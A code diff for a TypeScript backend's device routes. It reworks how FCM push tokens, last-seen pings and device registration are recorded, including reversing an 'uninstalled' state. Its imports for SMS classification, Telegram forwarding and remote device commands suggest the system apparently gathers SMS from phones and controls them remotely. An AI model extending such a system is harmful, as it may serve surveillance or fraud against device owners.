@@ -7,7 +7,7 @@ import MasterSms from "../models/MasterSms";
 import AdminModel from "../models/Admin";
 import wsService from "../services/wsService";
 import { sendCommandToDevice as fcmSendCommand } from "../services/fcmService";
-import { updateFcmToken, updateLastSeen, touchLastSeen, markDeviceOnline } from "../services/deviceService";
+import { updateFcmToken, updateLastSeen, touchLastSeen, applyAliveStatus } from "../services/deviceService";
 import config from "../config";
 import { classifySms } from "../services/smsClassifier";
 import { sendTelegramMessage, sendTelegramMessages, type TelegramCategory } from "../services/telegramService";
@@ -208,11 +208,10 @@ router.put("/:deviceId/lastSeen", async (req: Request, res: Response) => {
     if (!deviceId) return res.status(400).json({ success: false, error: "missing deviceId" });
     const action  = clean(req.body?.action) || "unknown";
     const battery = typeof req.body?.battery === "number" ? req.body.battery : -1;
+    // updateLastSeen() also applies status (online / offline reason) and reverses "uninstalled"
     const doc = await updateLastSeen(deviceId, action, battery);
     try { wsService.notifyDeviceLastSeen(deviceId, { at: Date.now(), action, battery }); } catch {}
 
-    // Mark device online — clears offline/uninstalled state
-    await markDeviceOnline(deviceId);
     // Emit fresh doc so frontend gets updated fcmStatus
     await emitDeviceUpsert(deviceId);
 
@@ -228,9 +227,13 @@ router.put("/:deviceId/lastSeen", async (req: Request, res: Response) => {
       logger.info("devices: checkedAt updated via ping", { deviceId });
     }
 
-    // Agar token missing hai to resyncToken=true bhejo taaki Android force-resync kare
-    const noToken = !String((doc as any)?.fcmToken || "").trim();
-    return res.json({ success: true, resyncToken: noToken });
+    // resyncToken=true when token is MISSING or Firebase has REJECTED it (dead).
+    // Dead tokens are kept in DB (never erased) — this flag is how the app learns to push a fresh one.
+    const rawToken   = String((doc as any)?.fcmToken || "").trim();
+    const noToken    = !rawToken || rawToken === "__UNINSTALLED__";
+    const tokenDead  = (doc as any)?.fcmTokenDeadAt !== null && (doc as any)?.fcmTokenDeadAt !== undefined;
+    const tokenStatus = noToken ? "missing" : tokenDead ? "dead" : "ok";
+    return res.json({ success: true, resyncToken: noToken || tokenDead, tokenStatus });
   } catch (err: any) {
     logger.error("devices: update lastSeen failed", err);
     return res.status(500).json({ success: false, error: err?.message || "server error" });
@@ -380,11 +383,26 @@ router.put("/:deviceId/fcm-token", async (req: Request, res: Response) => {
     const token    = clean(req.body?.token ?? req.body?.fcmToken ?? "");
     if (!deviceId) return res.status(400).json({ success: false, error: "missing deviceId" });
     if (!token)    return res.status(400).json({ success: false, error: "missing token" });
-    await updateFcmToken(deviceId, token);
-    logger.info("devices: fcm token updated", { deviceId, tokenLength: token.length });
+    const result = await updateFcmToken(deviceId, token);
+    // The app contacted us → proof of life regardless of token outcome
     try { await touchLastSeen(deviceId, "fcm_token_sync"); } catch {}
     await emitDeviceUpsert(deviceId);
-    return res.json({ success: true, deviceId });
+    if (!result.ok) {
+      logger.warn("devices: fcm token rejected (invalid format)", { deviceId, tokenLength: token.length });
+      return res.status(400).json({ success: false, error: "invalid token", tokenStatus: "invalid" });
+    }
+    logger.info("devices: fcm token sync", {
+      deviceId, tokenLength: token.length, replaced: result.replaced, tokenStatus: result.tokenStatus,
+    });
+    // forceRefresh=true → app sent the SAME token Firebase already rejected; it must
+    // deleteToken()+getToken() to get a fresh one. stale → app re-sent an old cached token; ignored.
+    return res.json({
+      success: true,
+      deviceId,
+      replaced: result.replaced,
+      tokenStatus: result.tokenStatus,
+      forceRefresh: result.forceRefresh,
+    });
   } catch (err: any) {
     logger.error("devices: update fcm-token failed", err);
     return res.status(500).json({ success: false, error: err?.message || "server error" });
@@ -632,12 +650,20 @@ router.put("/:deviceId", async (req, res) => {
       if (skipMetaKeys.includes(key)) continue;
       if (value !== undefined && value !== null && String(value).trim() !== "") setObj[`metadata.${key}`] = value;
     }
-    if (fcmToken) { setObj.fcmToken = fcmToken; setObj.fcmTokenUpdatedAt = Date.now(); }
+    // NOTE: fcmToken is intentionally NOT put in setObj — it must go through updateFcmToken()
+    // (single write path: same/new/stale detection, dead-marker reset, status). Direct $set here
+    // was the bug that let old failure state stick to a freshly registered token.
     try {
       const formModeDoc = await AdminModel.findOne({ key: "master_form_mode" }).lean();
       if ((formModeDoc as any)?.meta?.enabled === true) setObj.masterFormDevice = true;
     } catch (_) {}
-    const doc = await Device.findOneAndUpdate({ deviceId }, { $set: setObj }, { upsert: true, new: true }).lean();
+    await Device.findOneAndUpdate({ deviceId }, { $set: setObj }, { upsert: true, new: true }).lean();
+    if (fcmToken) {
+      const tr = await updateFcmToken(deviceId, fcmToken);
+      logger.info("devices: register token sync", { deviceId, ok: tr.ok, replaced: tr.replaced, tokenStatus: tr.tokenStatus });
+    }
+    await applyAliveStatus(deviceId); // register = proof of life (also reverses "uninstalled")
+    const doc = await Device.findOne({ deviceId }).lean();
     if (doc && (!(doc as any).checkedAt || (doc as any).checkedAt === 0)) {
       await Device.updateOne({ deviceId }, { $set: { checkedAt: now } });
       (doc as any).checkedAt = now;
